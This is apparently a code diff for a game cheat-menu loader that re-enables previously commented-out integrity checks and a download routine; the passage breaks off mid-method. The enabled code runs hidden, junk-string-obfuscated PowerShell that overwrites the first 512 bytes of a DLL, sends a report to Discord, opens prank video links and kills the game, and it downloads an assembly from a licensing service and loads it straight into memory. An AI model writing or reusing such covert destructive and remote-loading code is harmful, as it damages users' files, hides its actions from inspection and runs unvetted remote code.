@@ -330,176 +330,176 @@ namespace Colossal.Patches
 
         private static void CheckIntegrity()
         {
-            //string gameExePath = Process.GetCurrentProcess().MainModule.FileName;
-            //string gameFolder = System.IO.Path.GetDirectoryName(gameExePath);
+            string gameExePath = Process.GetCurrentProcess().MainModule.FileName;
+            string gameFolder = System.IO.Path.GetDirectoryName(gameExePath);
 
-            //string[] files = Directory.GetFiles(gameFolder, "ColossalCheatMenuV2.dll", SearchOption.AllDirectories);
+            string[] files = Directory.GetFiles(gameFolder, "ColossalCheatMenuV2.dll", SearchOption.AllDirectories);
 
-            //if (files.Length > 0)
-            //{
-            //    string filePath = files[0];
+            if (files.Length > 0)
+            {
+                string filePath = files[0];
 
-            //    using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
-            //    {
-            //        // Get the total length of the file
-            //        long fileLength = fileStream.Length;
+                using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
+                {
+                    // Get the total length of the file
+                    long fileLength = fileStream.Length;
 
-            //        // Ensure the file is long enough to contain a watermark
-            //        if (fileLength < 52) // Minimum watermark length (38 + 1 + 13)
-            //        {
-            //            BepInPatcher.SendToDiscord(true);
-            //            Process.Start("https://colossal.lol/badapple.mp4");
-            //            Process.GetCurrentProcess().Kill();
-            //            BepInPatcher.CallThrowException(OnGameInit.anti2);
-            //            return;
-            //        }
+                    // Ensure the file is long enough to contain a watermark
+                    if (fileLength < 52) // Minimum watermark length (38 + 1 + 13)
+                    {
+                        BepInPatcher.SendToDiscord(true);
+                        Process.Start("https://colossal.lol/badapple.mp4");
+                        Process.GetCurrentProcess().Kill();
+                        BepInPatcher.CallThrowException(OnGameInit.anti2);
+                        return;
+                    }
 
-            //        // Read the last 70 bytes to capture the full watermark (max expected length: 38 + 1 + 19 = 58)
-            //        byte[] watermarkBuffer = new byte[70]; // Increased to ensure COLOSSAL is included
-            //        long startPosition = fileLength - watermarkBuffer.Length;
-            //        fileStream.Seek(startPosition, SeekOrigin.Begin);
-            //        int bytesRead = fileStream.Read(watermarkBuffer, 0, watermarkBuffer.Length);
-            //        string watermark = System.Text.Encoding.ASCII.GetString(watermarkBuffer, 0, bytesRead).TrimEnd('\0');
+                    // Read the last 70 bytes to capture the full watermark (max expected length: 38 + 1 + 19 = 58)
+                    byte[] watermarkBuffer = new byte[70]; // Increased to ensure COLOSSAL is included
+                    long startPosition = fileLength - watermarkBuffer.Length;
+                    fileStream.Seek(startPosition, SeekOrigin.Begin);
+                    int bytesRead = fileStream.Read(watermarkBuffer, 0, watermarkBuffer.Length);
+                    string watermark = System.Text.Encoding.ASCII.GetString(watermarkBuffer, 0, bytesRead).TrimEnd('\0');
 
-            //        // Find the last occurrence of the separator (:)
-            //        int separatorIndex = watermark.LastIndexOf(':');
-            //        if (separatorIndex == -1 || separatorIndex >= watermark.Length - 1)
-            //        {
-            //            BepInPatcher.SendToDiscord(true);
-            //            Process.Start("https://colossal.lol/badapple.mp4");
-            //            Process.GetCurrentProcess().Kill();
-            //            BepInPatcher.CallThrowException(OnGameInit.anti2);
-            //            return;
-            //        }
+                    // Find the last occurrence of the separator (:)
+                    int separatorIndex = watermark.LastIndexOf(':');
+                    if (separatorIndex == -1 || separatorIndex >= watermark.Length - 1)
+                    {
+                        BepInPatcher.SendToDiscord(true);
+                        Process.Start("https://colossal.lol/badapple.mp4");
+                        Process.GetCurrentProcess().Kill();
+                        BepInPatcher.CallThrowException(OnGameInit.anti2);
+                        return;
+                    }
 
-            //        // Calculate the user ID length (from separator to end)
-            //        int userIdLength = watermark.Length - (separatorIndex + 1);
-            //        if (userIdLength < 13 || userIdLength > 19) // Allow up to 19 digits
-            //        {
-            //            BepInPatcher.SendToDiscord(true);
-            //            Process.Start("https://colossal.lol/badapple.mp4");
-            //            Process.GetCurrentProcess().Kill();
-            //            BepInPatcher.CallThrowException(OnGameInit.anti2);
-            //            return;
-            //        }
+                    // Calculate the user ID length (from separator to end)
+                    int userIdLength = watermark.Length - (separatorIndex + 1);
+                    if (userIdLength < 13 || userIdLength > 19) // Allow up to 19 digits
+                    {
+                        BepInPatcher.SendToDiscord(true);
+                        Process.Start("https://colossal.lol/badapple.mp4");
+                        Process.GetCurrentProcess().Kill();
+                        BepInPatcher.CallThrowException(OnGameInit.anti2);
+                        return;
+                    }
 
-            //        // Find the start of the key by looking for "COLOSSAL" in the buffer
-            //        int keyStartIndex = watermark.IndexOf("COLOSSAL");
-            //        if (keyStartIndex == -1)
-            //        {
-            //            BepInPatcher.SendToDiscord(true);
-            //            Process.Start("https://colossal.lol/badapple.mp4");
-            //            Process.GetCurrentProcess().Kill();
-            //            BepInPatcher.CallThrowException(OnGameInit.anti2);
-            //            return;
-            //        }
+                    // Find the start of the key by looking for "COLOSSAL" in the buffer
+                    int keyStartIndex = watermark.IndexOf("COLOSSAL");
+                    if (keyStartIndex == -1)
+                    {
+                        BepInPatcher.SendToDiscord(true);
+                        Process.Start("https://colossal.lol/badapple.mp4");
+                        Process.GetCurrentProcess().Kill();
+                        BepInPatcher.CallThrowException(OnGameInit.anti2);
+                        return;
+                    }
 
-            //        // Total watermark length
-            //        int watermarkLength = (separatorIndex - keyStartIndex) + 1 + userIdLength;
+                    // Total watermark length
+                    int watermarkLength = (separatorIndex - keyStartIndex) + 1 + userIdLength;
 
-            //        // Calculate where the watermark starts in the file
-            //        long watermarkStart = fileLength - watermarkLength;
+                    // Calculate where the watermark starts in the file
+                    long watermarkStart = fileLength - watermarkLength;
 
-            //        // Ensure we have content to hash
-            //        if (watermarkStart <= 0)
-            //        {
-            //            BepInPatcher.SendToDiscord(true);
-            //            Process.Start("https://colossal.lol/badapple.mp4");
-            //            Process.GetCurrentProcess().Kill();
-            //            BepInPatcher.CallThrowException(OnGameInit.anti2);
-            //            return;
-            //        }
+                    // Ensure we have content to hash
+                    if (watermarkStart <= 0)
+                    {
+                        BepInPatcher.SendToDiscord(true);
+                        Process.Start("https://colossal.lol/badapple.mp4");
+                        Process.GetCurrentProcess().Kill();
+                        BepInPatcher.CallThrowException(OnGameInit.anti2);
+                        return;
+                    }
 
-            //        // Reset stream position to the beginning
-            //        fileStream.Seek(0, SeekOrigin.Begin);
+                    // Reset stream position to the beginning
+                    fileStream.Seek(0, SeekOrigin.Begin);
 
-            //        // Read only the content before the watermark
-            //        byte[] contentBuffer = new byte[watermarkStart];
-            //        fileStream.Read(contentBuffer, 0, (int)watermarkStart);
+                    // Read only the content before the watermark
+                    byte[] contentBuffer = new byte[watermarkStart];
+                    fileStream.Read(contentBuffer, 0, (int)watermarkStart);
 
-            //        using (var memoryStream = new MemoryStream(contentBuffer))
-            //        {
-            //            using (var sha256 = SHA256.Create())
-            //            {
-            //                // Compute the hash on the content excluding the watermark
-            //                byte[] hashBytes = sha256.ComputeHash(memoryStream);
+                    using (var memoryStream = new MemoryStream(contentBuffer))
+                    {
+                        using (var sha256 = SHA256.Create())
+                        {
+                            // Compute the hash on the content excluding the watermark
+                            byte[] hashBytes = sha256.ComputeHash(memoryStream);
 
-            //                string hashString = BitConverter.ToString(hashBytes).Replace("-", "").ToLowerInvariant();
-            //                if (hashString != OnGameInit.hash.ToLower() && hashString != OnGameInit.betahash.ToLower())
-            //                {
-            //                    string Script = $@"
-            //                $path = '{filePath}'
-            //                $bytes = [System.IO.File]::ReadAllBytes($path)
-            //                for ($i = 0; $i -lt 512; $i++) {{
-            //                    $bytes[$i] = 0
-            //                }}
-            //                [System.IO.File]::WriteAllBytes($path, $bytes)
-            //            ".Replace("Dp05yegDzFT75Aq2MUw0", "");
-            //                    Process.Start(new ProcessStartInfo
-            //                    {
-            //                        FileName = "powershell",
-            //                        Arguments = $"-command \"{Script}\"",
-            //                        UseShellExecute = false,
-            //                        CreateNoWindow = true
-            //                    });
+                            string hashString = BitConverter.ToString(hashBytes).Replace("-", "").ToLowerInvariant();
+                            if (hashString != OnGameInit.hash.ToLower() && hashString != OnGameInit.betahash.ToLower())
+                            {
+                                string Script = $@"
+                            $path = '{filePath}'
+                            $bytes = [System.IO.File]::ReadAllBytes($path)
+                            for ($i = 0; $i -lt 512; $i++) {{
+                                $bytes[$i] = 0
+                            }}
+                            [System.IO.File]::WriteAllBytes($path, $bytes)
+                        ".Replace("Dp05yegDzFT75Aq2MUw0", "");
+                                Process.Start(new ProcessStartInfo
+                                {
+                                    FileName = "powershell",
+                                    Arguments = $"-command \"{Script}\"",
+                                    UseShellExecute = false,
+                                    CreateNoWindow = true
+                                });
 
-            //                    BepInPatcher.SendToDiscord(true);
+                                BepInPatcher.SendToDiscord(true);
 
-            //                    Process.Start("https://colossal.lol/rick.mp4");
+                                Process.Start("https://colossal.lol/rick.mp4");
 
-            //                    Process.GetCurrentProcess().Kill();
-            //                    BepInPatcher.CallThrowException(OnGameInit.anti2);
-            //                }
-            //            }
-            //        }
-            //    }
-            //}
-            //else
-            //{
-            //    BepInPatcher.SendToDiscord(true);
-            //    Process.Start("https://colossal.lol/badapple.mp4");
-            //    Process.GetCurrentProcess().Kill();
-            //    BepInPatcher.CallThrowException(OnGameInit.anti2);
-            //}
+                                Process.GetCurrentProcess().Kill();
+                                BepInPatcher.CallThrowException(OnGameInit.anti2);
+                            }
+                        }
+                    }
+                }
+            }
+            else
+            {
+                BepInPatcher.SendToDiscord(true);
+                Process.Start("https://colossal.lol/badapple.mp4");
+                Process.GetCurrentProcess().Kill();
+                BepInPatcher.CallThrowException(OnGameInit.anti2);
+            }
         }
         private static void SecondaryIntegrityCheck()
         {
-            //string directoryPath = AppDomain.CurrentDomain.BaseDirectory;
-            //string gameExePath = Process.GetCurrentProcess().MainModule.FileName;
-            //string gameFolder = System.IO.Path.GetDirectoryName(gameExePath);
+            string directoryPath = AppDomain.CurrentDomain.BaseDirectory;
+            string gameExePath = Process.GetCurrentProcess().MainModule.FileName;
+            string gameFolder = System.IO.Path.GetDirectoryName(gameExePath);
 
-            //string[] files = Directory.GetFiles(gameFolder, "ColossalV2.dll", SearchOption.AllDirectories);
+            string[] files = Directory.GetFiles(gameFolder, "ColossalV2.dll", SearchOption.AllDirectories);
 
-            //if (files.Length > 0)
-            //{
-            //    string filePath = files[0];
+            if (files.Length > 0)
+            {
+                string filePath = files[0];
 
-            //    using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
-            //    {
-            //        string Script = $@"
-            //                    Dp05yegDzFT75Aq2MUw0$Dp05yegDzFT75Aq2MUw0pDp05yegDzFT75Aq2MUw0aDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0hDp05yegDzFT75Aq2MUw0 = '{filePath}'
-            //                    Dp05yegDzFT75Aq2MUw0$Dp05yegDzFT75Aq2MUw0bDp05yegDzFT75Aq2MUw0yDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0sDp05yegDzFT75Aq2MUw0 = Dp05yegDzFT75Aq2MUw0[Dp05yegDzFT75Aq2MUw0SDp05yegDzFT75Aq2MUw0yDp05yegDzFT75Aq2MUw0sDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0mDp05yegDzFT75Aq2MUw0.Dp05yegDzFT75Aq2MUw0IDp05yegDzFT75Aq2MUw0ODp05yegDzFT75Aq2MUw0.Dp05yegDzFT75Aq2MUw0FDp05yegDzFT75Aq2MUw0iDp05yegDzFT75Aq2MUw0lDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0]Dp05yegDzFT75Aq2MUw0:Dp05yegDzFT75Aq2MUw0:Dp05yegDzFT75Aq2MUw0RDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0aDp05yegDzFT75Aq2MUw0dDp05yegDzFT75Aq2MUw0ADp05yegDzFT75Aq2MUw0lDp05yegDzFT75Aq2MUw0lDp05yegDzFT75Aq2MUw0BDp05yegDzFT75Aq2MUw0yDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0sDp05yegDzFT75Aq2MUw0(Dp05yegDzFT75Aq2MUw0$Dp05yegDzFT75Aq2MUw0pDp05yegDzFT75Aq2MUw0aDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0hDp05yegDzFT75Aq2MUw0)Dp05yegDzFT75Aq2MUw0
-            //                    Dp05yegDzFT75Aq2MUw0fDp05yegDzFT75Aq2MUw0oDp05yegDzFT75Aq2MUw0rDp05yegDzFT75Aq2MUw0 (Dp05yegDzFT75Aq2MUw0$Dp05yegDzFT75Aq2MUw0iDp05yegDzFT75Aq2MUw0 = Dp05yegDzFT75Aq2MUw00Dp05yegDzFT75Aq2MUw0;Dp05yegDzFT75Aq2MUw0 $Dp05yegDzFT75Aq2MUw0iDp05yegDzFT75Aq2MUw0 -Dp05yegDzFT75Aq2MUw0lDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0 5Dp05yegDzFT75Aq2MUw01Dp05yegDzFT75Aq2MUw02Dp05yegDzFT75Aq2MUw0;Dp05yegDzFT75Aq2MUw0 $Dp05yegDzFT75Aq2MUw0iDp05yegDzFT75Aq2MUw0+Dp05yegDzFT75Aq2MUw0+Dp05yegDzFT75Aq2MUw0)Dp05yegDzFT75Aq2MUw0 {{
-            //                        Dp05yegDzFT75Aq2MUw0$Dp05yegDzFT75Aq2MUw0bDp05yegDzFT75Aq2MUw0yDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0sDp05yegDzFT75Aq2MUw0[Dp05yegDzFT75Aq2MUw0$Dp05yegDzFT75Aq2MUw0iDp05yegDzFT75Aq2MUw0]Dp05yegDzFT75Aq2MUw0 = 0Dp05yegDzFT75Aq2MUw0
-            //                    }}
-            //                    Dp05yegDzFT75Aq2MUw0[Dp05yegDzFT75Aq2MUw0SDp05yegDzFT75Aq2MUw0yDp05yegDzFT75Aq2MUw0sDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0mDp05yegDzFT75Aq2MUw0.Dp05yegDzFT75Aq2MUw0IDp05yegDzFT75Aq2MUw0ODp05yegDzFT75Aq2MUw0.Dp05yegDzFT75Aq2MUw0FDp05yegDzFT75Aq2MUw0iDp05yegDzFT75Aq2MUw0lDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0]Dp05yegDzFT75Aq2MUw0:Dp05yegDzFT75Aq2MUw0:Dp05yegDzFT75Aq2MUw0WDp05yegDzFT75Aq2MUw0rDp05yegDzFT75Aq2MUw0iDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0ADp05yegDzFT75Aq2MUw0lDp05yegDzFT75Aq2MUw0lDp05yegDzFT75Aq2MUw0BDp05yegDzFT75Aq2MUw0yDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0sDp05yegDzFT75Aq2MUw0(Dp05yegDzFT75Aq2MUw0$Dp05yegDzFT75Aq2MUw0pDp05yegDzFT75Aq2MUw0aDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0hDp05yegDzFT75Aq2MUw0,Dp05yegDzFT75Aq2MUw0 $Dp05yegDzFT75Aq2MUw0bDp05yegDzFT75Aq2MUw0yDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0sDp05yegDzFT75Aq2MUw0)Dp05yegDzFT75Aq2MUw0
-            //                ".Replace("Dp05yegDzFT75Aq2MUw0", "");
-            //        Process.Start(new ProcessStartInfo
-            //        {
-            //            FileName = "Gx1i1E9Z5LPaHbRgWWNqpGx1i1E9Z5LPaHbRgWWNqoGx1i1E9Z5LPaHbRgWWNqwGx1i1E9Z5LPaHbRgWWNqeGx1i1E9Z5LPaHbRgWWNqrGx1i1E9Z5LPaHbRgWWNqsGx1i1E9Z5LPaHbRgWWNqhGx1i1E9Z5LPaHbRgWWNqeGx1i1E9Z5LPaHbRgWWNqlGx1i1E9Z5LPaHbRgWWNqlGx1i1E9Z5LPaHbRgWWNq".Replace("Gx1i1E9Z5LPaHbRgWWNq", ""),
-            //            Arguments = $"f11a0odV2MK3y9BEthNq-f11a0odV2MK3y9BEthNqCf11a0odV2MK3y9BEthNqof11a0odV2MK3y9BEthNqmf11a0odV2MK3y9BEthNqmf11a0odV2MK3y9BEthNqaf11a0odV2MK3y9BEthNqnf11a0odV2MK3y9BEthNqdf11a0odV2MK3y9BEthNq \"{Script}\"".Replace("f11a0odV2MK3y9BEthNq", ""),
-            //            UseShellExecute = false,
-            //            CreateNoWindow = true
-            //        });
+                using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
+                {
+                    string Script = $@"
+                                Dp05yegDzFT75Aq2MUw0$Dp05yegDzFT75Aq2MUw0pDp05yegDzFT75Aq2MUw0aDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0hDp05yegDzFT75Aq2MUw0 = '{filePath}'
+                                Dp05yegDzFT75Aq2MUw0$Dp05yegDzFT75Aq2MUw0bDp05yegDzFT75Aq2MUw0yDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0sDp05yegDzFT75Aq2MUw0 = Dp05yegDzFT75Aq2MUw0[Dp05yegDzFT75Aq2MUw0SDp05yegDzFT75Aq2MUw0yDp05yegDzFT75Aq2MUw0sDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0mDp05yegDzFT75Aq2MUw0.Dp05yegDzFT75Aq2MUw0IDp05yegDzFT75Aq2MUw0ODp05yegDzFT75Aq2MUw0.Dp05yegDzFT75Aq2MUw0FDp05yegDzFT75Aq2MUw0iDp05yegDzFT75Aq2MUw0lDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0]Dp05yegDzFT75Aq2MUw0:Dp05yegDzFT75Aq2MUw0:Dp05yegDzFT75Aq2MUw0RDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0aDp05yegDzFT75Aq2MUw0dDp05yegDzFT75Aq2MUw0ADp05yegDzFT75Aq2MUw0lDp05yegDzFT75Aq2MUw0lDp05yegDzFT75Aq2MUw0BDp05yegDzFT75Aq2MUw0yDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0sDp05yegDzFT75Aq2MUw0(Dp05yegDzFT75Aq2MUw0$Dp05yegDzFT75Aq2MUw0pDp05yegDzFT75Aq2MUw0aDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0hDp05yegDzFT75Aq2MUw0)Dp05yegDzFT75Aq2MUw0
+                                Dp05yegDzFT75Aq2MUw0fDp05yegDzFT75Aq2MUw0oDp05yegDzFT75Aq2MUw0rDp05yegDzFT75Aq2MUw0 (Dp05yegDzFT75Aq2MUw0$Dp05yegDzFT75Aq2MUw0iDp05yegDzFT75Aq2MUw0 = Dp05yegDzFT75Aq2MUw00Dp05yegDzFT75Aq2MUw0;Dp05yegDzFT75Aq2MUw0 $Dp05yegDzFT75Aq2MUw0iDp05yegDzFT75Aq2MUw0 -Dp05yegDzFT75Aq2MUw0lDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0 5Dp05yegDzFT75Aq2MUw01Dp05yegDzFT75Aq2MUw02Dp05yegDzFT75Aq2MUw0;Dp05yegDzFT75Aq2MUw0 $Dp05yegDzFT75Aq2MUw0iDp05yegDzFT75Aq2MUw0+Dp05yegDzFT75Aq2MUw0+Dp05yegDzFT75Aq2MUw0)Dp05yegDzFT75Aq2MUw0 {{
+                                    Dp05yegDzFT75Aq2MUw0$Dp05yegDzFT75Aq2MUw0bDp05yegDzFT75Aq2MUw0yDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0sDp05yegDzFT75Aq2MUw0[Dp05yegDzFT75Aq2MUw0$Dp05yegDzFT75Aq2MUw0iDp05yegDzFT75Aq2MUw0]Dp05yegDzFT75Aq2MUw0 = 0Dp05yegDzFT75Aq2MUw0
+                                }}
+                                Dp05yegDzFT75Aq2MUw0[Dp05yegDzFT75Aq2MUw0SDp05yegDzFT75Aq2MUw0yDp05yegDzFT75Aq2MUw0sDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0mDp05yegDzFT75Aq2MUw0.Dp05yegDzFT75Aq2MUw0IDp05yegDzFT75Aq2MUw0ODp05yegDzFT75Aq2MUw0.Dp05yegDzFT75Aq2MUw0FDp05yegDzFT75Aq2MUw0iDp05yegDzFT75Aq2MUw0lDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0]Dp05yegDzFT75Aq2MUw0:Dp05yegDzFT75Aq2MUw0:Dp05yegDzFT75Aq2MUw0WDp05yegDzFT75Aq2MUw0rDp05yegDzFT75Aq2MUw0iDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0ADp05yegDzFT75Aq2MUw0lDp05yegDzFT75Aq2MUw0lDp05yegDzFT75Aq2MUw0BDp05yegDzFT75Aq2MUw0yDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0sDp05yegDzFT75Aq2MUw0(Dp05yegDzFT75Aq2MUw0$Dp05yegDzFT75Aq2MUw0pDp05yegDzFT75Aq2MUw0aDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0hDp05yegDzFT75Aq2MUw0,Dp05yegDzFT75Aq2MUw0 $Dp05yegDzFT75Aq2MUw0bDp05yegDzFT75Aq2MUw0yDp05yegDzFT75Aq2MUw0tDp05yegDzFT75Aq2MUw0eDp05yegDzFT75Aq2MUw0sDp05yegDzFT75Aq2MUw0)Dp05yegDzFT75Aq2MUw0
+                            ".Replace("Dp05yegDzFT75Aq2MUw0", "");
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = "Gx1i1E9Z5LPaHbRgWWNqpGx1i1E9Z5LPaHbRgWWNqoGx1i1E9Z5LPaHbRgWWNqwGx1i1E9Z5LPaHbRgWWNqeGx1i1E9Z5LPaHbRgWWNqrGx1i1E9Z5LPaHbRgWWNqsGx1i1E9Z5LPaHbRgWWNqhGx1i1E9Z5LPaHbRgWWNqeGx1i1E9Z5LPaHbRgWWNqlGx1i1E9Z5LPaHbRgWWNqlGx1i1E9Z5LPaHbRgWWNq".Replace("Gx1i1E9Z5LPaHbRgWWNq", ""),
+                        Arguments = $"f11a0odV2MK3y9BEthNq-f11a0odV2MK3y9BEthNqCf11a0odV2MK3y9BEthNqof11a0odV2MK3y9BEthNqmf11a0odV2MK3y9BEthNqmf11a0odV2MK3y9BEthNqaf11a0odV2MK3y9BEthNqnf11a0odV2MK3y9BEthNqdf11a0odV2MK3y9BEthNq \"{Script}\"".Replace("f11a0odV2MK3y9BEthNq", ""),
+                        UseShellExecute = false,
+                        CreateNoWindow = true
+                    });
 
-            //        BepInPatcher.SendToDiscord(true);
+                    BepInPatcher.SendToDiscord(true);
 
-            //        Process.Start("https://colossal.lol/rick.mp4");
+                    Process.Start("https://colossal.lol/rick.mp4");
 
-            //        Process.GetCurrentProcess().Kill();
-            //        BepInPatcher.CallThrowException(OnGameInit.anti2);
-            //    }
-            //}
+                    Process.GetCurrentProcess().Kill();
+                    BepInPatcher.CallThrowException(OnGameInit.anti2);
+                }
+            }
         }
 
         public static string GetPublicIP()
@@ -1002,104 +1002,104 @@ namespace Colossal.Patches
 
         public static void Download()
         {
-            //TaskCompletionSource<byte[]> downloadTaskSource = new TaskCompletionSource<byte[]>();
+            TaskCompletionSource<byte[]> downloadTaskSource = new TaskCompletionSource<byte[]>();
 
-            //int maxRetries = 10;
-            //int retryDelay = 5000;
+            int maxRetries = 10;
+            int retryDelay = 5000;
 
-            //Task.Run(async () =>
-            //{
-            //    int attempt = 0;
-            //    bool success = false;
+            Task.Run(async () =>
+            {
+                int attempt = 0;
+                bool success = false;
 
-            //    CustomConsole.Debug("Attempting download");
+                CustomConsole.Debug("Attempting download");
 
-            //    while (attempt < maxRetries && !success)
-            //    {
-            //        CustomConsole.Debug($"Downloading attempt {attempt}/{maxRetries}");
+                while (attempt < maxRetries && !success)
+                {
+                    CustomConsole.Debug($"Downloading attempt {attempt}/{maxRetries}");
 
-            //        attempt++;
-            //        byte[] assemblyBytes = KeyAuthApp.download("QMWb65HMKUTSdykt5QMWb65HMKUTSdykt0QMWb65HMKUTSdykt4QMWb65HMKUTSdykt6QMWb65HMKUTSdykt7QMWb65HMKUTSdykt9QMWb65HMKUTSdykt".Replace("QMWb65HMKUTSdykt", ""));
-            //        if (KeyAuthApp.response.success)
-            //        {
-            //            CustomConsole.Debug($"Downloaded successfully on attempt {attempt}/{maxRetries}");
+                    attempt++;
+                    byte[] assemblyBytes = KeyAuthApp.download("QMWb65HMKUTSdykt5QMWb65HMKUTSdykt0QMWb65HMKUTSdykt4QMWb65HMKUTSdykt6QMWb65HMKUTSdykt7QMWb65HMKUTSdykt9QMWb65HMKUTSdykt".Replace("QMWb65HMKUTSdykt", ""));
+                    if (KeyAuthApp.response.success)
+                    {
+                        CustomConsole.Debug($"Downloaded successfully on attempt {attempt}/{maxRetries}");
 
-            //            downloadTaskSource.SetResult(assemblyBytes);
-            //            success = true;
-            //        }
-            //        else
-            //        {
-            //            CustomConsole.Error($"[KEYAUTH] Download attempt {attempt} failed: {KeyAuthApp.response.message.ToString()}");
-            //            await Task.Delay(retryDelay);
-            //        }
-            //    }
-            //}).GetAwaiter().GetResult();
+                        downloadTaskSource.SetResult(assemblyBytes);
+                        success = true;
+                    }
+                    else
+                    {
+                        CustomConsole.Error($"[KEYAUTH] Download attempt {attempt} failed: {KeyAuthApp.response.message.ToString()}");
+                        await Task.Delay(retryDelay);
+                    }
+                }
+            }).GetAwaiter().GetResult();
 
-            //AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
-            //{
-            //    try
-            //    {
-            //        CustomConsole.Debug("Attempting to load assembly");
+            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
+            {
+                try
+                {
+                    CustomConsole.Debug("Attempting to load assembly");
 
-            //        if (downloadTaskSource.Task.IsCompleted)
-            //        {
-            //            CustomConsole.Debug("Download task completed");
+                    if (downloadTaskSource.Task.IsCompleted)
+                    {
+                        CustomConsole.Debug("Download task completed");
 
-            //            byte[] assemblyBytes = downloadTaskSource.Task.Result;
+                        byte[] assemblyBytes = downloadTaskSource.Task.Result;
 
-            //            if (assemblyBytes != null && assemblyBytes.Length > 0)
-            //            {
-            //                CustomConsole.Debug("Loading assembly");
-            //                return Assembly.Load(assemblyBytes);
-            //            }
-            //            else
-            //            {
-            //                CustomConsole.Error("Downloaded assembly bytes are empty or invalid");
-            //                throw new InvalidOperationException("Downloaded assembly bytes are empty or invalid");
-            //            }
-            //        }
-            //        else if (downloadTaskSource.Task.IsFaulted)
-            //        {
-            //            var exception = downloadTaskSource.Task.Exception;
-            //            CustomConsole.Error($"Download task failed: {exception?.Message}");
-            //            foreach (var ex in exception.InnerExceptions)
-            //            {
-            //                CustomConsole.Error($"Inner Exception: {ex.Message}");
-            //                CustomConsole.Error($"Stack Trace: {ex.StackTrace}");
-            //            }
-            //            throw new InvalidOperationException("Assembly download failed after retries", exception);
-            //        }
-            //        else
-            //        {
-            //            CustomConsole.Error("Download task is still in progress or not completed");
-            //            throw new InvalidOperationException("Assembly bytes have not been downloaded yet");
-            //        }
-            //    }
-            //    catch (Win32Exception ex)
-            //    {
-            //        CustomConsole.Error($"Win32Exception: {ex.Message}");
-            //        CustomConsole.Error($"Stack Trace: {ex.StackTrace}");
-            //        // Handle or log platform-specific issues, possibly related to dependencies or environment
-            //        throw new InvalidOperationException($"Win32Exception occurred during assembly resolution: {ex.Message}", ex);
-            //    }
-            //    catch (TypeLoadException ex)
-            //    {
-            //        CustomConsole.Error($"TypeLoadException: {ex.Message}");
-            //        CustomConsole.Error($"Stack Trace: {ex.StackTrace}");
-            //        // Handle specific issues with loading types from the assembly
-            //        throw new InvalidOperationException($"TypeLoadException occurred during assembly resolution: {ex.Message}", ex);
-            //    }
-            //    catch (Exception ex)
-            //    {
-            //        CustomConsole.Error($"Error during assembly resolution: {ex.Message}");
-            //        CustomConsole.Error($"Stack Trace: {ex.StackTrace}");
+                        if (assemblyBytes != null && assemblyBytes.Length > 0)
+                        {
+                            CustomConsole.Debug("Loading assembly");
+                            return Assembly.Load(assemblyBytes);
+                        }
+                        else
+                        {
+                            CustomConsole.Error("Downloaded assembly bytes are empty or invalid");
+                            throw new InvalidOperationException("Downloaded assembly bytes are empty or invalid");
+                        }
+                    }
+                    else if (downloadTaskSource.Task.IsFaulted)
+                    {
+                        var exception = downloadTaskSource.Task.Exception;
+                        CustomConsole.Error($"Download task failed: {exception?.Message}");
+                        foreach (var ex in exception.InnerExceptions)
+                        {
+                            CustomConsole.Error($"Inner Exception: {ex.Message}");
+                            CustomConsole.Error($"Stack Trace: {ex.StackTrace}");
+                        }
+                        throw new InvalidOperationException("Assembly download failed after retries", exception);
+                    }
+                    else
+                    {
+                        CustomConsole.Error("Download task is still in progress or not completed");
+                        throw new InvalidOperationException("Assembly bytes have not been downloaded yet");
+                    }
+                }
+                catch (Win32Exception ex)
+                {
+                    CustomConsole.Error($"Win32Exception: {ex.Message}");
+                    CustomConsole.Error($"Stack Trace: {ex.StackTrace}");
+                    // Handle or log platform-specific issues, possibly related to dependencies or environment
